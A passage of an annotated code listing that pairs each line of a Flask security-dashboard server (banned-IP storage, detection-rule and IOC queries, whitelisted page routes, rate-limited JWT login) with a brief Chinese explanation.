| 1005 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1006 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1007 | 函数定义：声明 `_sync_banned_cache_from_db` 的输入、处理逻辑和返回结果。 | `def _sync_banned_cache_from_db(state: _ServerState) -> None:` |
| 1008 | 文档字符串：说明当前模块、类或函数的职责。 | `    """封禁列表真源为 \`\`BannedIp\`\` 表；\`\`state.banned_ips\`\` 仅为兼容缓存。"""` |
| 1009 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 1010 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = db.session.query(BannedIp).all()` |
| 1011 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.banned_ips = {r.ip: r.reason for r in rows}` |
| 1012 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["banned_ips"] = len(state.banned_ips)` |
| 1013 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 1014 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[BannedIp] 缓存同步失败", exc_info=True)` |
| 1015 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1016 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1017 | 函数定义：声明 `_persist_banned_ip` 的输入、处理逻辑和返回结果。 | `def _persist_banned_ip(` |
| 1018 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ip: str, reason: str, *, operator: Optional[str] = None` |
| 1019 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> None:` |
| 1020 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason_s = (reason or "manual")[:200]` |
| 1021 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = db.session.get(BannedIp, ip)` |
| 1022 | 条件判断：满足条件时进入对应分支。 | `    if row is None:` |
| 1023 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(BannedIp(ip=ip, reason=reason_s, operator=operator))` |
| 1024 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 1025 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.reason = reason_s` |
| 1026 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.operator = operator` |
| 1027 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
| 1028 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1029 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1030 | 函数定义：声明 `_delete_banned_ip_persistent` 的输入、处理逻辑和返回结果。 | `def _delete_banned_ip_persistent(ip: str) -> bool:` |
| 1031 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = db.session.get(BannedIp, ip)` |
| 1032 | 条件判断：满足条件时进入对应分支。 | `    if row is None:` |
| 1033 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 1034 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.delete(row)` |
| 1035 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
| 1036 | 返回结果：把处理后的值交回调用方。 | `    return True` |
| 1037 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1038 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1039 | 函数定义：声明 `_rule_row_to_api_dict` 的输入、处理逻辑和返回结果。 | `def _rule_row_to_api_dict(row: Rule) -> Dict[str, Any]:` |
| 1040 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 1041 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "id": row.id,` |
| 1042 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": row.name,` |
| 1043 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": row.rule_type,` |
| 1044 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": row.pattern,` |
| 1045 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": row.action,` |
| 1046 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": row.level,` |
| 1047 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": row.priority,` |
| 1048 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": row.enabled,` |
| 1049 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": row.description or "",` |
| 1050 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hits": int(row.hits or 0),` |
| 1051 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "created_at": _dt_iso(row.created_at),` |
| 1052 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "updated_at": _dt_iso(row.updated_at),` |
| 1053 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 1054 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1055 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1056 | 函数定义：声明 `_list_rules_from_db` 的输入、处理逻辑和返回结果。 | `def _list_rules_from_db(` |
| 1057 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 1058 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    type_: Optional[str],` |
| 1059 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enabled: Optional[bool],` |
| 1060 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    q: Optional[str],` |
| 1061 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> List[Dict[str, Any]]:` |
| 1062 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    query = db.session.query(Rule)` |
| 1063 | 条件判断：满足条件时进入对应分支。 | `    if type_:` |
| 1064 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Rule.rule_type == type_)` |
| 1065 | 条件判断：满足条件时进入对应分支。 | `    if enabled is not None:` |
| 1066 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(Rule.enabled.is_(enabled))` |
| 1067 | 条件判断：满足条件时进入对应分支。 | `    if q:` |
| 1068 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        like = f"%{q.strip()}%"` |
| 1069 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        query = query.filter(` |
| 1070 | 函数调用：执行已有函数/方法完成当前步骤。 | `            or_(` |
| 1071 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Rule.name.ilike(like),` |
| 1072 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Rule.description.ilike(like),` |
| 1073 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Rule.pattern.ilike(like),` |
| 1074 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Rule.rule_type.ilike(like),` |
| 1075 | 函数调用：执行已有函数/方法完成当前步骤。 | `                Rule.action.ilike(like),` |
| 1076 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1077 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1078 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rows = query.all()` |
| 1079 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    items = [_rule_row_to_api_dict(r) for r in rows]` |
| 1080 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1081 | 函数定义：声明 `_ts_key` 的输入、处理逻辑和返回结果。 | `    def _ts_key(r: Dict[str, Any]) -> float:` |
| 1082 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts = _parse_iso(r.get("updated_at"))` |
| 1083 | 返回结果：把处理后的值交回调用方。 | `        return -ts.timestamp() if ts else 0.0` |
| 1084 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1085 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    items.sort(key=lambda r: (int(r.get("priority", 100)), _ts_key(r)))` |
| 1086 | 返回结果：把处理后的值交回调用方。 | `    return items` |
| 1087 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1088 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1089 | 函数定义：声明 `_insert_rule_from_normalized` 的输入、处理逻辑和返回结果。 | `def _insert_rule_from_normalized(norm: Dict[str, Any]) -> Rule:` |
| 1090 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rid = _uuid()` |
| 1091 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    now = datetime.now(timezone.utc)` |
| 1092 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = Rule(` |
| 1093 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        id=rid,` |
| 1094 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        name=norm["name"],` |
| 1095 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule_type=norm["type"],` |
| 1096 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pattern=norm["pattern"],` |
| 1097 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action=norm["action"],` |
| 1098 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level=norm["level"],` |
| 1099 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        priority=int(norm.get("priority", 100)),` |
| 1100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        enabled=bool(norm.get("enabled", True)),` |
| 1101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        description=norm.get("description"),` |
| 1102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        hits=0,` |
| 1103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        created_at=now,` |
| 1104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        updated_at=now,` |
| 1105 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1106 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.add(row)` |
| 1107 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.commit()` |
| 1108 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.session.refresh(row)` |
| 1109 | 返回结果：把处理后的值交回调用方。 | `    return row` |
| 1110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1112 | 函数定义：声明 `_apply_partial_to_rule_row` 的输入、处理逻辑和返回结果。 | `def _apply_partial_to_rule_row(row: Rule, partial: Dict[str, Any]) -> None:` |
| 1113 | 条件判断：满足条件时进入对应分支。 | `    if "name" in partial:` |
| 1114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.name = partial["name"]` |
| 1115 | 条件判断：满足条件时进入对应分支。 | `    if "type" in partial:` |
| 1116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.rule_type = partial["type"]` |
| 1117 | 条件判断：满足条件时进入对应分支。 | `    if "pattern" in partial:` |
| 1118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.pattern = partial["pattern"]` |
| 1119 | 条件判断：满足条件时进入对应分支。 | `    if "action" in partial:` |
| 1120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.action = partial["action"]` |
| 1121 | 条件判断：满足条件时进入对应分支。 | `    if "level" in partial:` |
| 1122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.level = partial["level"]` |
| 1123 | 条件判断：满足条件时进入对应分支。 | `    if "priority" in partial:` |
| 1124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.priority = int(partial["priority"])` |
| 1125 | 条件判断：满足条件时进入对应分支。 | `    if "enabled" in partial:` |
| 1126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.enabled = bool(partial["enabled"])` |
| 1127 | 条件判断：满足条件时进入对应分支。 | `    if "description" in partial:` |
| 1128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.description = partial["description"]` |
| 1129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row.updated_at = datetime.now(timezone.utc)` |
| 1130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1132 | 函数定义：声明 `_incr_rule_hits_db` 的输入、处理逻辑和返回结果。 | `def _incr_rule_hits_db(rule_id: str, delta: int = 1) -> None:` |
| 1133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = db.session.get(Rule, rule_id)` |
| 1134 | 条件判断：满足条件时进入对应分支。 | `    if row:` |
| 1135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.hits = int(row.hits or 0) + delta` |
| 1136 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1139 | 函数定义：声明 `_active_ioc_count` 的输入、处理逻辑和返回结果。 | `def _active_ioc_count() -> int:` |
| 1140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    now = datetime.now(timezone.utc)` |
| 1141 | 返回结果：把处理后的值交回调用方。 | `    return (` |
| 1142 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.count(IOC.id))` |
| 1143 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter((IOC.expires_at.is_(None)) \| (IOC.expires_at > now))` |
| 1144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .scalar()` |
| 1145 | 代码语句：参与当前文件的业务流程或数据处理。 | `        or 0` |
| 1146 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1149 | 函数定义：声明 `_rules_enabled_count` 的输入、处理逻辑和返回结果。 | `def _rules_enabled_count() -> int:` |
| 1150 | 返回结果：把处理后的值交回调用方。 | `    return (` |
| 1151 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.count(Rule.id)).filter(Rule.enabled.is_(True)).scalar() or 0` |
| 1152 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1153 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1155 | 函数定义：声明 `_rules_total_count` 的输入、处理逻辑和返回结果。 | `def _rules_total_count() -> int:` |
| 1156 | 返回结果：把处理后的值交回调用方。 | `    return db.session.query(func.count(Rule.id)).scalar() or 0` |
| 1157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1158 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1159 | 函数定义：声明 `_compute_security_score_db` 的输入、处理逻辑和返回结果。 | `def _compute_security_score_db() -> int:` |
| 1160 | 文档字符串：说明当前模块、类或函数的职责。 | `    """基于数据库告警分布的启发式安全分（与仪表盘一致）。"""` |
| 1161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    critical = (` |
| 1162 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.count(Alert.id))` |
| 1163 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(Alert.level == "critical")` |
| 1164 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .scalar()` |
| 1165 | 代码语句：参与当前文件的业务流程或数据处理。 | `        or 0` |
| 1166 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    high = (` |
| 1168 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.count(Alert.id)).filter(Alert.level == "high").scalar() or 0` |
| 1169 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    open_n = (` |
| 1171 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.count(Alert.id))` |
| 1172 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(Alert.status == "open")` |
| 1173 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .scalar()` |
| 1174 | 代码语句：参与当前文件的业务流程或数据处理。 | `        or 0` |
| 1175 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1176 | 返回结果：把处理后的值交回调用方。 | `    return max(0, min(100, 100 - min(60, critical * 8 + high * 3 + open_n * 2)))` |
| 1177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1178 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1179 | 函数定义：声明 `_incr_ioc_hit_db` 的输入、处理逻辑和返回结果。 | `def _incr_ioc_hit_db(ioc_type: str, canon_value: str) -> None:` |
| 1180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    row = (` |
| 1181 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(IOC)` |
| 1182 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(IOC.ioc_type == ioc_type, IOC.value == canon_value)` |
| 1183 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .one_or_none()` |
| 1184 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1185 | 条件判断：满足条件时进入对应分支。 | `    if row:` |
| 1186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.hits = int(row.hits or 0) + 1` |
| 1187 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1190 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 1191 | 注释：解释下面或当前这段代码的设计意图。 | `# 页面路由` |
| 1192 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 1193 | 注释：解释下面或当前这段代码的设计意图。 | `# 合法的页面名白名单，避免模板穿越` |
| 1194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_PAGE_WHITELIST: Dict[str, str] = {` |
| 1195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "dashboard": "dashboard.html",` |
| 1196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "alerts": "alerts.html",` |
| 1197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "threat_intel": "threat_intel.html",` |
| 1198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "rules": "rules.html",` |
| 1199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "reports": "reports.html",` |
| 1200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "command": "command.html",` |
| 1201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "settings": "settings.html",` |
| 1202 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 1203 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1204 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1205 | 函数定义：声明 `_register_page_routes` 的输入、处理逻辑和返回结果。 | `def _register_page_routes(app: Flask) -> None:` |
| 1206 | 文档字符串：说明当前模块、类或函数的职责。 | `    """注册模板渲染路由。` |
| 1207 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1208 | 代码语句：参与当前文件的业务流程或数据处理。 | `    服务器端只渲染页面骨架，JWT 在浏览器侧由 \`utils.js\` 校验；` |
| 1209 | 代码语句：参与当前文件的业务流程或数据处理。 | `    页面本身不含敏感数据，所有真实数据通过受保护的 \`/api/*\` 拉取。` |
| 1210 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 1211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1212 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/")` |
| 1213 | 函数定义：声明 `index` 的输入、处理逻辑和返回结果。 | `    def index():  # type: ignore[unused-function]` |
| 1214 | 返回结果：把处理后的值交回调用方。 | `        return redirect(url_for("page_dashboard"))` |
| 1215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1216 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/login")` |
| 1217 | 函数定义：声明 `page_login` 的输入、处理逻辑和返回结果。 | `    def page_login():  # type: ignore[unused-function]` |
| 1218 | 返回结果：把处理后的值交回调用方。 | `        return render_template("login.html", page="login")` |
| 1219 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1220 | 注释：解释下面或当前这段代码的设计意图。 | `    # 为每个合法页面生成独立视图函数` |
| 1221 | 循环：逐个处理集合或迭代器中的元素。 | `    for slug, template in _PAGE_WHITELIST.items():` |
| 1222 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1223 | 函数定义：声明 `_view` 的输入、处理逻辑和返回结果。 | `        def _view(slug: str = slug, template: str = template):` |
| 1224 | 返回结果：把处理后的值交回调用方。 | `            return render_template(template, page=slug)` |
| 1225 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        _view.__name__ = f"page_{slug}"` |
| 1227 | 函数调用：执行已有函数/方法完成当前步骤。 | `        app.add_url_rule(f"/{slug}", endpoint=f"page_{slug}", view_func=_view)` |
| 1228 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1229 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1230 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 1231 | 注释：解释下面或当前这段代码的设计意图。 | `# REST API` |
| 1232 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 1233 | 函数定义：声明 `_register_api_routes` 的输入、处理逻辑和返回结果。 | `def _register_api_routes(app: Flask, limiter: Limiter, state: _ServerState) -> None:` |
| 1234 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 健康检查（匿名） --------------------------------------------` |
| 1235 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/health")` |
| 1236 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.exempt` |
| 1237 | 函数定义：声明 `health_check` 的输入、处理逻辑和返回结果。 | `    def health_check():  # type: ignore[unused-function]` |
| 1238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = app.extensions.get("guardian_os_config")` |
| 1239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks = _runtime_dependency_checks(app, cfg) if cfg is not None else {}` |
| 1240 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1241 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1242 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "healthy",` |
| 1244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "timestamp": _now_iso(),` |
| 1245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "checks": checks,` |
| 1246 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1247 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1248 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1249 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1250 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1251 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 登录 / Token 刷新 / 当前用户 --------------------------------` |
| 1252 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/auth/login", methods=["POST"])` |
| 1253 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("5 per minute")` |
| 1254 | 函数定义：声明 `auth_login` 的输入、处理逻辑和返回结果。 | `    def auth_login():  # type: ignore[unused-function]` |
| 1255 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        data = request.get_json(silent=True) or {}` |
| 1256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        username = str(data.get("username", "")).strip()` |
| 1257 | 占位语句：保持语法完整但当前不执行操作。 | `        password = str(data.get("password", ""))` |
| 1258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1259 | 条件判断：满足条件时进入对应分支。 | `        if not username or not password:` |
| 1260 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1261 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1262 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="bad_request",` |
| 1264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="username 与 password 必填",` |
| 1265 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1266 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1267 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 1268 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1269 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1270 | 注释：解释下面或当前这段代码的设计意图。 | `        # Phase 8：优先走 ADMIN_PASSWORD_HASH（Werkzeug pbkdf2:sha256），` |
| 1271 | 注释：解释下面或当前这段代码的设计意图。 | `        # 明文 ADMIN_PASSWORD 仅作向后兼容，命中即打印安全警告。` |
| 1272 | 注释：解释下面或当前这段代码的设计意图。 | `        # 详见 src/utils/auth.py。` |
| 1273 | 条件判断：满足条件时进入对应分支。 | `        if not verify_admin_credentials(username, password):` |
| 1274 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Auth] 登录失败: user=%s from %s", username, get_remote_address())` |
| 1275 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1276 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1277 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="auth_failed",` |
| 1279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="用户名或密码错误",` |
| 1280 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1281 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1282 | 代码语句：参与当前文件的业务流程或数据处理。 | `                401,` |
| 1283 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1284 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        access_token = create_access_token(identity=username)` |
| 1286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        refresh_token = create_refresh_token(identity=username)` |
| 1287 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1288 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1289 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "access_token": access_token,` |
| 1291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "refresh_token": refresh_token,` |
| 1292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "token_type": "bearer",` |
| 1293 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "username": username,` |
| 1294 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1295 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1296 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1297 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1298 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1299 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/auth/refresh", methods=["POST"])` |
| 1300 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required(refresh=True)` |
| 1301 | 函数定义：声明 `auth_refresh` 的输入、处理逻辑和返回结果。 | `    def auth_refresh():  # type: ignore[unused-function]` |
| 1302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        identity = get_jwt_identity()` |
| 1303 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"access_token": create_access_token(identity=identity)}), 200` |
| 1304 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
